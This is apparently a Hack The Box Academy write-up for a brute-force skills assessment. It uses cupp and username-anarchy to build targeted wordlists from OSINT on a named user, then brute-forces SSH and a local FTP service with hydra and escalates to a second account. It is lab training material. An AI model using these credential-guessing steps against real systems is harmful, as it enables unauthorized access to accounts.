# Brute Force Skills Assessment Service Login  

[Skills Assessment Service Login](https://academy.hackthebox.com/module/57/section/516)  

>Previous Target user: `Harry Potter`
>Target: `94.237.49.11:30154` - Server: `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1`   

>As you now have the name of an employee from the previous skills assessment question, 
>try to gather basic information about them, and generate a custom password wordlist that meets the password policy. 
>Also use 'usernameGenerator' to generate potential usernames for the employee. 
>Finally, try to brute force the SSH server shown above to get the flag.  

## OSINT  

>OSINT about Harry Potter : [Harry Potter - Wikipedia](https://en.wikipedia.org/wiki/Harry_Potter_character)  

## Custom Wordlists  

```
cupp -i
```  

![skills-assessment-service-login-cupp](/images/skills-assessment-service-login-cupp.png)  

>Based on the company securoty password policy we need to Cleanup the password wordlist `harry.txt`  

```
sed -ri '/^.{,7}$/d' harry.txt
sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt
sed -ri '/[0-9]+/!d' harry.txt
```  

>With username Generator,  Create [custom username wordlist](https://academy.hackthebox.com/module/57/section/512) based on employee full names: `Harry Potter`

```
./username-anarchy Harry Potter > harry-potter-names.txt
```

## Brute Force  

>SSH Brute Force - User/Pass Wordlists [Service Authentication Brute Forcing](https://academy.hackthebox.com/module/57/section/491)  
>If `HYDRA` use more than 4 threads, some requests may get dropped by the SSH server.  

```
hydra -L harry-potter-names.txt -P harry.txt -u -f ssh://94.237.49.11:30154 -t 4
```  

![skills-assessment-service-login-hydra](/images/skills-assessment-service-login-hydra.png)  

>Credentials brute forced result: login: `harry.potter`, password: `H4rry!!!`

## Foothold

>SSH to target wit obtained credentials.  

```
ssh harry.potter@94.237.49.11 -p 30154
```  

## Privilege Escalation  

>Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.
>Discover local listening services and their ports on the target.  

```
netstat -antp | grep -i list
```  

>Identify usernames on local system for linux.  

```
ls -al /home
```  

>FTP local services with new user discovered as the target, `g.potter`.  

```
hydra -l g.potter -P /home/harry.potter/rockyou-30.txt ftp://127.0.0.1
```

>Switch user in SSH session to `g.potter` and the brute forced password discoverd: `harry`.  

```
su g.pottter
```  

![harry-potter.png](/images/harry-potter.png)  